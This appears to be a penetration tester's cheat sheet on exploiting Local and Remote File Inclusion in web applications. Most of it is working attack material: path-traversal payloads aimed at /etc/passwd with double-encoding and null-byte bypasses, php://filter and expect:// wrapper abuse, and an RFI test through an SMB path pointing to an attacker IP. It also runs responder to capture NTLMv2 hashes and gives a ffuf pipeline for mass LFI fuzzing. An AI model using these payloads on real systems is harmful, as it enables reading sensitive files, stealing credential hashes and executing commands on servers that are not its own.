lfisuite tool from github 
A interesting tool to exploit this vulnerability: https://github.com/kurobeats/fimap    
 
If LFI found on system try to fetch common windows file like
/windows/system32/license.rtf
/windows/pather/unattend.xml

2. In case if you are not getting anything sensitive information or not able to exploit it,
go for RFI by hosting a local SMB server and confirm it by running nc on 445 eg.
http://example.php?file=\\10.10.14.111\htb\file.txt
nc -lvnp 445
If receive hits on nc it means it is vulnerable to RFI.

3. Also run responder and try to get a NTLMv2 hash
responder -I eth0

4. Use tcpdump to verify
tcpdump -i eth0 port 445    
    
    
Local File Inclusion 

http://example.com/index.php?page=index.php         asia file chiye parameter value me to hi lfi hoga

http://example.com/index.php?page=../../../etc/passwd   


common parameter look on
file, document, folder, root, path, pg, style, pdf, template, php_path, doc
dest, redirect, uri, path, continue, url, window, next, data, reference, site, html, val, validate, domain,
callback, return, page, feed, port, host, to, out, view, dir, show, navigation, open
4) lfi - /var/www/html/ & /etc/passwd
../../etc/passwd
  
 

use  Encoding        #for encoding double encoding  check mastering morden web penetest
http://example.com/index.php?page=..%252f..%252f..%252fetc%252fpasswd
http://example.com/index.php?page=..%c0%af..%c0%af..%c0%afetc%c0%afpasswd
http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd
http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd%00



php://filter#
You found a LFI, you included the file but you can't see its content?

Some file like config.php or libraries of functions are only executed but not shown. So to help us show them, we can use some PHP wrappers.

A famous one is index.php?page=php://filter/read=convert.base64-encode/resource=config, this filter will encode the page in base64 and show the result like if we have done index.php?page=config and then base64 it.



expect://#
A rare but very useful wrapper is expect://, it allows execution of system commands via php. But it is not enabled by default, an extension needs to be installed.

automation 

cat urls | gf lfi | tee lfi.txt 

cat lfi.txt | qsreplace FUZZ | while read url; do ffuf -u $url -mr "root:x" -w  wordlist/lfipayload.txt; done
